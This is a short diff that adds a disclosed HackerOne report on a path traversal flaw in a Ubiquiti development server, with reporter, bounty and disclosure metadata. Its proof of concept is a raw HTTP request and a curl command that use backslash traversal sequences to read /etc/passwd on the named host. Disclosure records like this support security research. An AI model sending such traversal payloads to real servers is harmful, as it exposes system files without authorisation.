@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/260420
+WeaknessName:Path Traversal
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Ubiquiti Networks(ubnt)
+BountyAmount:100.0
+Severity:high
+State:Closed
+DateOfDisclosure:14.09.2017 18:23:06
+
+Summary:
+
+**Description**
+Reading files outside the web root via path traversal
+
+**PoC**
+```http
+GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
+Host: dev-nightly.ubnt.com
+```
+```
+curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
+```
+
+**Result**
+{F213057}
